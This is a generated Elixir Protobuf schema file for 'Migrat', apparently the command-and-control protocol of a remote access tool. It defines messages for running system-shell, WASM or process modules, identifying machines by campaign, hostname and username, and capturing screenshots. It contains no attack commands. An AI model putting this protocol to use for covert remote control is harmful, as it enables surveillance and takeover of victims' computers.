defmodule Migrat.ModuleStart.ModuleType do
  @moduledoc false
  use Protobuf, enum: true, protoc_gen_elixir_version: "0.11.0", syntax: :proto3

  field :MODULE_SYSTEMSHELL, 0
  field :MODULE_WASM, 1
  field :MODULE_PROCESS, 2
end

defmodule Migrat.ModuleStart do
  @moduledoc false
  use Protobuf, protoc_gen_elixir_version: "0.11.0", syntax: :proto3

  field :name, 1, type: :string
  field :data, 2, type: :bytes
  field :args, 3, repeated: true, type: :string
  field :type, 4, type: Migrat.ModuleStart.ModuleType, enum: true
end

defmodule Migrat.ModuleList do
  @moduledoc false
  use Protobuf, protoc_gen_elixir_version: "0.11.0", syntax: :proto3

  field :modules, 1, repeated: true, type: :string
end

defmodule Migrat.ModuleOutput do
  @moduledoc false
  use Protobuf, protoc_gen_elixir_version: "0.11.0", syntax: :proto3

  field :name, 1, type: :string
  field :output, 2, type: :string
end

defmodule Migrat.ModuleInput do
  @moduledoc false
  use Protobuf, protoc_gen_elixir_version: "0.11.0", syntax: :proto3

  field :name, 1, type: :string
  field :input, 2, type: :string
end

defmodule Migrat.Error do
  @moduledoc false
  use Protobuf, protoc_gen_elixir_version: "0.11.0", syntax: :proto3

  field :message, 1, type: :string
end

defmodule Migrat.HeartbeatResponse do
  @moduledoc false
  use Protobuf, protoc_gen_elixir_version: "0.11.0", syntax: :proto3

  field :keep_open, 1, type: :bool, json_name: "keepOpen"
end

defmodule Migrat.Ident do
  @moduledoc false
  use Protobuf, protoc_gen_elixir_version: "0.11.0", syntax: :proto3

  field :id, 1, type: :string
  field :campainId, 2, type: :string
  field :computerName, 3, type: :string
  field :processname, 4, type: :string
  field :username, 5, type: :string
end

defmodule Migrat.TakeScreenshot do
  @moduledoc false
  use Protobuf, protoc_gen_elixir_version: "0.11.0", syntax: :proto3

  field :screen, 1, type: :int32
end

defmodule Migrat.Screenshot do
  @moduledoc false
  use Protobuf, protoc_gen_elixir_version: "0.11.0", syntax: :proto3

  field :time, 1, type: :string
  field :data, 2, type: :bytes
end